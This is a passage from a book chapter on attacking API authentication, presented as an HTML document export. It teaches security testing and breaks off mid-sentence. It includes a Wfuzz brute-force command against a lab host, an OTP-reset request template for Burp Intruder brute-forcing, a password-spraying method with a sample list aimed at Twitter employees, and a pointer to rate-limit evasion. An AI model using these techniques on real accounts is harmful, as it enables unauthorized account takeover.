<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol.lst-kix_abwgqyb9rxny-2.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-2 0}.lst-kix_abwgqyb9rxny-7>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-7}.lst-kix_abwgqyb9rxny-0>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-0,decimal) ". "}.lst-kix_abwgqyb9rxny-1>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-1}.lst-kix_abwgqyb9rxny-1>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-1,lower-latin) ". "}.lst-kix_abwgqyb9rxny-4>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-4}ol.lst-kix_abwgqyb9rxny-0.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-0 0}.lst-kix_abwgqyb9rxny-2>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-2,lower-roman) ". "}.lst-kix_abwgqyb9rxny-4>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-4,lower-latin) ". "}.lst-kix_abwgqyb9rxny-3>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-3,decimal) ". "}ol.lst-kix_abwgqyb9rxny-4.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-4 0}ol.lst-kix_abwgqyb9rxny-5.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-5 0}.lst-kix_abwgqyb9rxny-5>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-5}.lst-kix_abwgqyb9rxny-8>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-8}ol.lst-kix_abwgqyb9rxny-7{list-style-type:none}ol.lst-kix_abwgqyb9rxny-6{list-style-type:none}ol.lst-kix_abwgqyb9rxny-7.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-7 0}ol.lst-kix_abwgqyb9rxny-8{list-style-type:none}.lst-kix_abwgqyb9rxny-2>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-2}ol.lst-kix_abwgqyb9rxny-8.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-8 0}ol.lst-kix_abwgqyb9rxny-1{list-style-type:none}ol.lst-kix_abwgqyb9rxny-0{list-style-type:none}ol.lst-kix_abwgqyb9rxny-3{list-style-type:none}ol.lst-kix_abwgqyb9rxny-1.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-1 0}ol.lst-kix_abwgqyb9rxny-2{list-style-type:none}ol.lst-kix_abwgqyb9rxny-3.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-3 0}ol.lst-kix_abwgqyb9rxny-5{list-style-type:none}.lst-kix_abwgqyb9rxny-0>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-0}ol.lst-kix_abwgqyb9rxny-4{list-style-type:none}.lst-kix_abwgqyb9rxny-3>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-3}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_abwgqyb9rxny-6>li{counter-increment:lst-ctn-kix_abwgqyb9rxny-6}.lst-kix_abwgqyb9rxny-6>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-6,decimal) ". "}.lst-kix_abwgqyb9rxny-8>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-8,lower-roman) ". "}.lst-kix_abwgqyb9rxny-5>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-5,lower-roman) ". "}ol.lst-kix_abwgqyb9rxny-6.start{counter-reset:lst-ctn-kix_abwgqyb9rxny-6 0}.lst-kix_abwgqyb9rxny-7>li:before{content:"" counter(lst-ctn-kix_abwgqyb9rxny-7,lower-latin) ". "}ol{margin:0;padding:0}table td,table th{padding:0}.c7{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;text-indent:12pt;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c23{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c0{border-right-style:solid;padding-top:6pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.125;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c26{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c25{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.0;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c4{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-top-style:solid;background-color:#ffffff;margin-left:54pt;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c18{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:78pt;border-top-color:#000000;border-bottom-style:solid}.c2{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:69pt;border-top-color:#000000;border-bottom-style:solid}.c5{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:75.8pt;border-top-color:#000000;border-bottom-style:solid}.c6{background-color:#ffffff;color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Arial";font-style:normal}.c3{background-color:#eef2f6;color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Courier New";font-style:normal}.c10{background-color:#ffffff;color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Times New Roman";font-style:italic}.c21{-webkit-text-decoration-skip:none;color:#d3002d;font-weight:400;text-decoration:underline;text-decoration-skip-ink:none;font-size:12pt;font-family:"Times New Roman"}.c30{-webkit-text-decoration-skip:none;color:#d3002d;font-weight:400;text-decoration:underline;text-decoration-skip-ink:none;font-size:9pt;font-family:"Times New Roman"}.c28{-webkit-text-decoration-skip:none;color:#d3002d;font-weight:700;text-decoration:underline;text-decoration-skip-ink:none;font-size:9pt;font-family:"Times New Roman"}.c11{padding-top:24pt;padding-bottom:42pt;line-height:1.75;orphans:2;widows:2;text-align:left}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c17{padding-top:18pt;padding-bottom:18pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c22{padding-top:24pt;padding-bottom:24pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c31{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#3d3b49;font-weight:400}.c29{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#188038;font-weight:400}.c41{background-color:#000000;color:#ffffff;font-weight:700;font-size:23.5pt;font-family:"Times New Roman"}.c37{background-color:#000000;color:#ffffff;font-weight:700;font-size:10pt;font-family:"Arial"}.c20{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#3d3b49;font-weight:700}.c8{font-size:12pt;font-family:"Times New Roman";color:#3d3b49;font-weight:700}.c35{color:#3d3b49;font-weight:700;font-size:40.5pt;font-family:"Times New Roman"}.c42{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.c32{font-size:9.5pt;font-family:"Times New Roman";color:#3d3b49;font-weight:400}.c15{color:#3d3b49;font-weight:700;font-size:14.5pt;font-family:"Times New Roman"}.c16{color:#3d3b49;font-weight:700;font-size:23.5pt;font-family:"Times New Roman"}.c40{border-spacing:0;border-collapse:collapse;margin-right:auto}.c1{font-size:12pt;font-family:"Times New Roman";color:#3d3b49;font-weight:400}.c36{color:#3d3b49;font-weight:700;font-size:54pt;font-family:"Times New Roman"}.c12{text-decoration:none;vertical-align:baseline;font-style:normal}.c27{text-decoration:none;vertical-align:baseline}.c39{padding:0;margin:0}.c24{color:inherit;text-decoration:inherit}.c38{max-width:468pt;padding:72pt 72pt 72pt 72pt}.c13{background-color:#ffffff;font-style:italic}.c19{background-color:#ffffff}.c34{height:11pt}.c33{height:42pt}.c14{font-style:italic}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c19 c38 doc-content"><h1 class="c26" id="h.3qbzfk7o7x65"><span class="c12 c19 c36">8</span></h1><h1 class="c26" id="h.3qbzfk7o7x65-1"><span class="c12 c19 c35">ATTACKING AUTHENTICATION</span></h1><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 610.67px; height: 800.00px;"><img alt="" src="images/image5.png" style="width: 610.67px; height: 800.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c23 c19"><span class="c1 c12">When it comes to testing authentication, you&rsquo;ll find that many of the flaws that have plagued web applications for decades have been ported over to APIs: bad passwords and password requirements, default credentials, verbose error messaging, and bad password reset processes.</span></p><p class="c7"><span class="c1 c12">In addition, several weaknesses are much more commonly found in APIs than traditional web apps. Broken API authentication comes in many forms. You might encounter a lack of authentication altogether, a lack of rate limiting applied to authentication attempts, the use of a single token or key for all requests, tokens created with insufficient entropy, and several JSON Web Token (JWT) configuration weaknesses.</span></p><p class="c7"><span class="c1 c12">This chapter will guide you through classic authentication attacks like brute-force attacks and password spraying, and then we&rsquo;ll cover API-specific token attacks, such as token forgery and JWT attacks. Generally, these attacks share the common goal of gaining unauthorized access, whether this means going from a state of no access to a state of unauthorized access, obtaining access to the resources of other users, or going from a state of limited API access to one of privileged access.</span></p><h2 class="c26 c19" id="h.n7hgtamckwns"><span class="c12 c16">Classic Authentication Attacks</span></h2><p class="c23 c19"><span class="c1 c12">In Chapter 2, we covered the simplest form of authentication used in APIs: basic authentication. To authenticate using this method, the consumer issues a request containing a username and password. As we know, RESTful APIs do not maintain state, so if the API uses basic authentication across the API, a username and password would have to be issued with every request. Thus, providers typically use basic authentication only as part of a registration process. Then, after users have successfully authenticated, the provider issues an API key or token. The provider then checks that the username and password match the authentication information stored. If the credentials match, the provider issues a successful response. If they don&rsquo;t match, the API may issue one of several responses. The provider may just send a generic response for all incorrect authentication attempts: &ldquo;Incorrect username or password.&rdquo; This tells us the least amount of information, but sometimes providers will tilt the scales toward consumer convenience and provide us with more useful information. The provider could specifically tell us that a username does not exist. Then we will have a response we can use to help us discover and validate usernames.</span></p><h3 class="c26 c19" id="h.b8cb5tknjf6s"><span class="c15 c12">Password Brute-Force Attacks</span></h3><p class="c23 c19"><span class="c1 c12">One of the more straightforward methods for gaining access to an API is performing a brute-force attack. Brute-forcing an API&rsquo;s authentication is not very different from any other brute-force attack, except you&rsquo;ll send the request to an API endpoint, the payload will often be in JSON, and the authentication values may be base64 encoded. Brute-force attacks are loud, often time-consuming, and brutish, but if an API lacks security controls to prevent brute-force attacks, we should not shy away from using this to our advantage.</span></p><p class="c7"><span class="c1">One of the best ways to fine-tune your brute-force attack is to generate passwords specific to your target. To do this, you could leverage the information revealed in an excessive data exposure vulnerability, like the one you found in Lab #4, to compile a username and password list. The excess data could reveal technical details about the user&rsquo;s account, such as whether the user was using multifactor authentication, whether they had a default password, and whether the account has been activated. If the excess data involved information about the user, you could feed it to tools that can generate large, targeted password lists for brute-force attacks. For more information about creating targeted password lists, check out the Mentalist app (</span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://github.com/sc0tfree/mentalist&amp;sa=D&amp;source=editors&amp;ust=1681144468687102&amp;usg=AOvVaw1JlQFkBAODQ9hj9M48kL7R">https://github.com/sc0tfree/mentalist</a></span><span class="c1">) or the Common User Passwords Profiler (</span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://github.com/Mebus/cupp&amp;sa=D&amp;source=editors&amp;ust=1681144468687462&amp;usg=AOvVaw3nPV6T5rPYUn08xHZo_-es">https://github.com/Mebus/cupp</a></span><span class="c1 c12">).</span></p><p class="c7"><span class="c1">To actually perform the brute-force attack once you have a suitable wordlist, you can use tools such as Burp Suite&rsquo;s brute forcer or Wfuzz, introduced in Chapter 4. The following example uses Wfuzz with an old, well-known password list, </span><span class="c1 c14">rockyou.txt</span><span class="c1 c12">:</span></p><p class="c9"><span class="c31">$ </span><span class="c20">wfuzz -d &#39;{&quot;email&quot;:&quot;a@email.com&quot;,&quot;password&quot;:&quot;FUZZ&quot;}&#39; --hc 405 -H &#39;Content-Type: application/json&#39; -z file,/home/hapihacker/rockyou.txt http://192.168.195.130:8888/api/v2/auth</span></p><p class="c9"><span class="c3">==================================================================</span></p><p class="c9"><span class="c3">ID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Response &nbsp; Lines &nbsp; &nbsp;Word &nbsp; &nbsp; &nbsp; Chars &nbsp; &nbsp; &nbsp; Payload</span></p><p class="c9"><span class="c3">==================================================================</span></p><p class="c9"><span class="c3">000000007: &nbsp; 200 &nbsp; &nbsp; &nbsp; &nbsp;0 L &nbsp; &nbsp; &nbsp;1 W &nbsp; &nbsp; &nbsp; &nbsp;225 Ch &nbsp; &nbsp; &nbsp;&quot;Password1!&quot;</span></p><p class="c17"><span class="c3">000000005: &nbsp; 400 &nbsp; &nbsp; &nbsp; &nbsp;0 L &nbsp; &nbsp; &nbsp;34 W &nbsp; &nbsp; &nbsp; 474 Ch &nbsp; &nbsp; &nbsp;&quot;win&quot;</span></p><p class="c7"><span class="c1">The </span><span class="c29">-d</span><span class="c1">&nbsp;option allows you to fuzz content that is sent in the body of a POST request. The curly brackets that follow contain the POST request body. To discover the request format used in this example, I attempted to authenticate to a web application using a browser, and then I captured the authentication attempt and replicated its structure here. In this instance, the web app issues a POST request with the parameters </span><span class="c29">&quot;email&quot;</span><span class="c1">&nbsp;and </span><span class="c29">&quot;password&quot;</span><span class="c1">. The structure of this body will change for each API. In this example, you can see that we&rsquo;ve specified a known email and used the </span><span class="c29">FUZZ</span><span class="c1 c12">&nbsp;parameter as the password.</span></p><p class="c7"><span class="c1">The </span><span class="c29">--hc</span><span class="c1">&nbsp;option hides responses with certain response codes. This is useful if you often receive the same status code, word length, and character count in many requests. If you know what a typical failure response looks like for your target, there is no need to see hundreds or thousands of that same response. The </span><span class="c29">&ndash;hc</span><span class="c1 c12">&nbsp;option helps you filter out the responses you don&rsquo;t want to see.</span></p><p class="c7"><span class="c1">In the tested instance, the typical failed request results in a 405 status code, but this may also differ with each API. Next, the </span><span class="c29">-H</span><span class="c1">&nbsp;option lets you add a header to the request. Some API providers may issue an HTTP 415 Unsupported Media Type error code if you don&rsquo;t include the </span><span class="c29">Content-Type:application/json</span><span class="c1 c12">&nbsp;header when sending JSON data in the request body.</span></p><p class="c7"><span class="c1">Once your request has been sent, you can review the results in the command line. If your </span><span class="c29">&ndash;hc</span><span class="c1 c12">&nbsp;Wfuzz option has worked out, your results should be fairly easy to read. Otherwise, status codes in the 200s and 300s should be good indicators that you have successfully brute-forced credentials.</span></p><h3 class="c26 c19" id="h.eo4z22dxq72t"><span class="c15 c12">Password Reset and Multifactor Authentication Brute-Force Attacks</span></h3><p class="c23 c19"><span class="c1 c12">While you can apply brute-force techniques directly to the authentication requests, you can also use them against password reset and multifactor authentication (MFA) functionality. If a password reset process includes security questions and does not apply rate limiting to requests, we can target it in such an attack.</span></p><p class="c7"><span class="c1 c12">Like GUI web applications, APIs often use SMS recovery codes or one-time passwords (OTPs) in order to verify the identity of a user who wants to reset their password. Additionally, a provider may deploy MFA to successful authentication attempts, so you&rsquo;ll have to bypass that process to gain access to the account. On the backend, an API often implements this functionality using a service that sends a four- to six-digit code to the phone number or email associated with the account. If we&rsquo;re not stopped by rate limiting, we should be able to brute-force these codes to gain access to the targeted account.</span></p><p class="c7"><span class="c1 c12">Begin by capturing a request for the relevant process, such as a password reset process. In the following request, you can see that the consumer includes an OTP in the request body, along with the username and new password. Thus, to reset a user&rsquo;s password, we&rsquo;ll need to guess the OTP.</span></p><p class="c9"><span class="c3">POST /identity/api/auth/v3/check-otp HTTP/1.1</span></p><p class="c9"><span class="c3">Host: 192.168.195.130:8888</span></p><p class="c9"><span class="c3">User-Agent: Mozilla/5.0 (x11; Linux x86_64; rv: 78.0) Gecko/20100101</span></p><p class="c9"><span class="c3">Accept: */*</span></p><p class="c9"><span class="c3">Accept -Language: en-US, en;q=0.5</span></p><p class="c9"><span class="c3">Accept-Encoding: gzip,deflate</span></p><p class="c9"><span class="c3">Referer: http://192.168.195.130:8888/forgot-password</span></p><p class="c9"><span class="c3">Content-Type: application/json</span></p><p class="c9"><span class="c3">Origin: http://192.168.195.130:8888</span></p><p class="c9"><span class="c3">Content-Length: 62</span></p><p class="c9"><span class="c3">Connection: close</span></p><p class="c9 c34"><span class="c3"></span></p><p class="c9"><span class="c3">{</span></p><p class="c9"><span class="c3">&quot;email&quot;:&quot;a@email.com&quot;,</span></p><p class="c9"><span class="c20">&quot;otp&quot;:&quot;1234&quot;</span><span class="c3">,</span></p><p class="c9"><span class="c3">&quot;password&quot;: &quot;Newpassword&quot;</span></p><p class="c17"><span class="c3">}</span></p><p class="c7"><span class="c1">In this example, we&rsquo;ll leverage the brute forcer payload type in Burp Suite, but you could configure and run an equivalent attack using Wfuzz with brute-force options. Once you&rsquo;ve captured a password reset request in Burp Suite, highlight the OTP and add the attack position markers discussed in Chapter 4 to turn the value into a variable. Next, select the </span><span class="c8">Payloads</span><span class="c1">&nbsp;tab and set the payload type to </span><span class="c8">brute forcer</span><span class="c1">&nbsp;(see </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-1&amp;sa=D&amp;source=editors&amp;ust=1681144468692746&amp;usg=AOvVaw31koWV1D4XeYSeDqKWO8-J">Figure 8-1</a></span><span class="c1 c12">).</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 314.67px;"><img alt="Screenshot of the Burp Suite Payloads tab with the &ldquo;Payload set&rdquo; field set to &ldquo;1,&rdquo; the &ldquo;Payload type&rdquo; field set to &ldquo;Brute forcer,&rdquo; the &ldquo;Character set&rdquo; field set to&rdquo; 0123456789,&rdquo; and the Min length and Max length fields both set to &ldquo;4&rdquo;" src="images/image7.png" style="width: 624.00px; height: 314.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-1</span><span class="c10">: Configuring Burp Suite Intruder with the brute forcer payload type set</span></p><p class="c7"><span class="c1">If you&rsquo;ve configured your payload settings correctly, they should match those in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-1&amp;sa=D&amp;source=editors&amp;ust=1681144468693661&amp;usg=AOvVaw1ddy3vOpcQeqggFdEwTIfU">Figure 8-1</a></span><span class="c1">. In the character set field, only include numbers and characters used for the OTP. In its verbose error messaging, the API provider may indicate what values it expects. You can often test this by initiating a password reset of your own account and checking to see what the OTP consists of. For example, if the API uses a four-digit numeric code, add the numbers 0 to 9 to the character set. Then set the minimum and maximum length of the code to </span><span class="c8">4</span><span class="c1 c12">.</span></p><p class="c7"><span class="c1 c12">Brute-forcing the password reset code is definitely worth a try. However, many web applications will both enforce rate limiting and limit the number of times you can guess the OTP. If rate limiting is holding you back, perhaps one of the evasion techniques in Chapter 13 could be of some use.</span></p><h3 class="c26 c19" id="h.mr9b2ml9w29"><span class="c15 c12">Password Spraying</span></h3><p class="c23 c19"><span class="c1">Many security controls could prevent you from successfully brute-forcing an API&rsquo;s authentication. A technique called </span><span class="c1 c14">password spraying</span><span class="c1 c12">&nbsp;can evade many of these controls by combining a long list of users with a short list of targeted passwords. Let&rsquo;s say you know that an API authentication process has a lockout policy in place and will only allow 10 login attempts. You could craft a list of the nine most likely passwords (one less password than the limit) and use these to attempt to log in to many user accounts.</span></p><p class="c7"><span class="c1">When you&rsquo;re password spraying, large and outdated wordlists like </span><span class="c1 c14">rockyou.txt</span><span class="c1 c12">&nbsp;won&rsquo;t work. There are way too many unlikely passwords in such a file to have any success. Instead, craft a short list of likely passwords, taking into account the constraints of the API provider&rsquo;s password policy, which you can discover during reconnaissance. Most password policies likely require a minimum character length, upper- and lowercase letters, and perhaps a number or special character.</span></p><p class="c7"><span class="c1">Try mixing your password-spraying list with two types of </span><span class="c1 c14">path of small-resistance (POS)</span><span class="c1">&nbsp;passwords, or passwords that are simple enough to guess but complex enough to meet basic password requirements (generally a minimum of eight characters, a symbol, upper- and lowercase letters, and a number). The first type includes obvious passwords like QWER!@#$, Password1!, and the formula </span><span class="c1 c14">Season+Year+Symbol</span><span class="c1 c12">&nbsp;(such as Winter2021!, Spring2021?, Fall2021!, and Autumn2021?). The second type includes more advanced passwords that relate directly to the target, often including a capitalized letter, a number, a detail about the organization, and a symbol. Here is a short password-spraying list I might generate if I were attacking an endpoint for Twitter employees:</span></p><ol class="c39 lst-kix_abwgqyb9rxny-0 start" start="1"><li class="c4 li-bullet-0"><span class="c1 c12">Winter2021!</span></li><li class="c4 li-bullet-0"><span class="c1 c12">Spring2021!</span></li><li class="c4 li-bullet-0"><span class="c1 c12">QWER!@#$</span></li><li class="c4 li-bullet-0"><span class="c1 c12">Password1!</span></li><li class="c4 li-bullet-0"><span class="c1 c12">March212006!</span></li><li class="c4 li-bullet-0"><span class="c1 c12">July152006!</span></li><li class="c4 li-bullet-0"><span class="c1 c12">Twitter@2022</span></li><li class="c4 li-bullet-0"><span class="c1 c12">JPD1976!</span></li><li class="c4 li-bullet-0"><span class="c1 c12">Dorsey@2021</span></li></ol><p class="c7"><span class="c1 c12">The key to password spraying is to maximize your user list. The more usernames you include, the higher your odds of gaining access. Build a user list during your reconnaissance efforts or by discovering excessive data exposure vulnerabilities.</span></p><p class="c7"><span class="c1">In Burp Suite&rsquo;s Intruder, you can set up this attack in a similar manner to the standard brute-force attack, except you&rsquo;ll use both a list of users and a list of passwords. Choose the cluster bomb attack type and set the attack positions around the username and password, as shown in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-2&amp;sa=D&amp;source=editors&amp;ust=1681144468696439&amp;usg=AOvVaw3RwRrAFJihbH4ApnHQBzyT">Figure 8-2</a></span><span class="c1 c12">.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 246.67px;"><img alt="Screenshot of the Burp Suite Payload Positions screen with the Attack type set to &ldquo;Cluster bomb&rdquo; and the email and password fields set to payload positions in the POST request body" src="images/image9.png" style="width: 624.00px; height: 246.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-2</span><span class="c10">: A credential-spraying attack using Intruder</span></p><p class="c7"><span class="c1">Notice that the first attack position is set to replace the username in front of </span><span class="c1 c14">@email.com</span><span class="c1 c12">, which you can do if you&rsquo;ll only be testing for users within a specific email domain.</span></p><p class="c7"><span class="c1">Next, add the list of collected users as the first payload set and a short list of passwords as your second payload set. Once your payloads are configured as in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-3&amp;sa=D&amp;source=editors&amp;ust=1681144468697600&amp;usg=AOvVaw00Gbf-iLL6nbB6QZrlpGil">Figure 8-3</a></span><span class="c1 c12">, you&rsquo;re ready to perform a password-spraying attack.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 384.00px;"><img alt="Two screenshots of Burp Suite&rsquo;s Payload Sets and Payload Options screens. The first has the &ldquo;Payload set&rdquo; field set to one and a list of names as the Payload Options. The second has the &ldquo;Payload set&rdquo; field set to 2 and a list of common passwords as the Payload Options." src="images/image16.png" style="width: 624.00px; height: 384.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-3</span><span class="c10">: Burp Suite Intruder example payloads for a cluster bomb attack</span></p><p class="c7"><span class="c1">When you&rsquo;re analyzing the results, it helps if you have an idea of what a standard successful login looks like. If you&rsquo;re unsure, search for anomalies in the lengths and response codes returned. Most web applications respond to successful login results with an HTTP status code in the 200s or 300s. In </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-4&amp;sa=D&amp;source=editors&amp;ust=1681144468698351&amp;usg=AOvVaw0-ibDaQfMSRyGpDFC6jVB2">Figure 8-4</a></span><span class="c1 c12">, you can see a successful password-spraying attempt that has two anomalous features: a status code of 200 and a response length of 682.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 558.67px; height: 221.33px;"><img alt="Screenshot of Burp Suite Intruder with a list of submitted payloads, the status codes received in the response, and the length of each response. Most have a status code of 500 and a length of 479, but one has a status code of 200 and a length of 682." src="images/image4.png" style="width: 558.67px; height: 221.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-4</span><span class="c10">: A successful password-spraying attack using Intruder</span></p><p class="c7"><span class="c1 c12">To help spot anomalies using Intruder, you can sort the results by status code or response length.</span></p><h3 class="c26 c19" id="h.ekgnfwuvb9ym"><span class="c15 c12">Including Base64 Authentication in Brute-Force Attacks</span></h3><p class="c23 c19"><span class="c1 c12">Some APIs will base64-encode authentication payloads sent in an API request. There are many reasons to do this, but it&rsquo;s important to know that security is not one of them. You can easily bypass this minor inconvenience.</span></p><p class="c7"><span class="c1">If you test an authentication attempt and notice that an API is encoding to base64, it is likely making a comparison to base64-encoded credentials on the backend. This means you should adjust your fuzzing attacks to include base64 payloads using Burp Suite Intruder, which can both encode and decode base64 values. For example, the password and email values in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-5&amp;sa=D&amp;source=editors&amp;ust=1681144468699593&amp;usg=AOvVaw325THiQQr3aZX60kxswvoj">Figure 8-5</a></span><span class="c1">&nbsp;are base64 